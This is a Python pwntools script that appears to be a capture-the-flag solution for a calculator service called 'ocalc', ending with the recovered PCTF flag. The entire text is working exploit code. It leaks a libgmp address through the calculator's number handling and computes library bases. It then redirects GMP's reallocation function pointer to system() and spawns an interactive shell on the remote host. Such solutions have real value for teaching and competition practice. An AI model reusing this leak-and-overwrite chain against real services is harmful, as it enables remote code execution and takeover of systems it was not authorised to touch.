from pwn import *
from subprocess import check_output
import os

context.terminal = ["kitty"]

if args.LOCAL:
    script = """
    # add-symbol-file ./libgmp.so.10.5.0 -s .text 0x00007ffff7ee9000+0xb040
    # add-symbol-file ./ld-musl-x86_64.so.1 -s .text 0x00007ffff7f59000+0x14080 -s .data 0x00007ffff7f59000+0x00a2000 -s .bss 0x00007ffff7f59000+0x00a2420
    c
    """
    path = "./src/_build/default/ocalc.exe"
    path = "./ocalc"
    p = remote("localhost", 1337)
    p.recv(1)

    pid = int(check_output("pgrep ocalc", shell=True))
    gdb.attach(pid, gdbscript=script, exe="./build/ocalc", sysroot=f"/proc/{sys}/root/")
else:
    p = remote("ocalc.chal.pwni.ng", "1337")

def send(payload: str):
    p.sendlineafter(b"@ ", payload)

def skip(count: int):
    send(b"\n" * count)
    for _ in range(count):
        p.recvuntil(b"@ ")

send(f"{1 << 64}".encode())
send(b"1")
send(b"++")
send(b"0 0 0 0 0")
skip(0x2000)
for _ in range(7):
    send(b"1")
for _ in range(12):
    send(b"drop")

leak = int(p.recvline()[7:])
leak = leak >> 64
libgmp = leak + 0x123e50
linker = leak + 0x193e50

log.info(f"{leak = :#x}")
log.info(f"{libgmp = :#x}")
log.info(f"{linker = :#x}")

send(b"drop")

send(f"{1 << 64}".encode())
send(b"1")
send(b"++")
send(b"0 0 0 0 0")
skip(0x2000)

for _ in range(35):
    send(b"0")

payload = p32(3) + p32(2)
# pointers at libgmp base + 0x69070
# address to read/write
target = libgmp + 0x69078
payload += p64(target)

payload = int.from_bytes(payload, "little")
print(payload.bit_length())
assert payload.bit_length() < 64 + 48

send(f"{payload}".encode())

for _ in range(35 + 6):
    send(b"drop")

gmp = ELF("./libgmp.so.10.5.0", checksec=False)
gmp.address = libgmp
lnk = ELF("./linker.so.1", checksec=False)
lnk.address = linker

offset = lnk.sym.system - gmp.sym.__gmp_default_reallocate - 0x6000
log.info(f"{offset = :#x}")
send(f"{offset} +".encode())
shell = u16(b"sh")
send(f"{shell}".encode())
plus = 1 << 128
send(f"{plus} +".encode())

p.interactive()

# PCTF{is_my_c4lculat0rs_s0s0_s3ndy_now_52b30a433ebb7a7b884999a28f25777a157f5b14}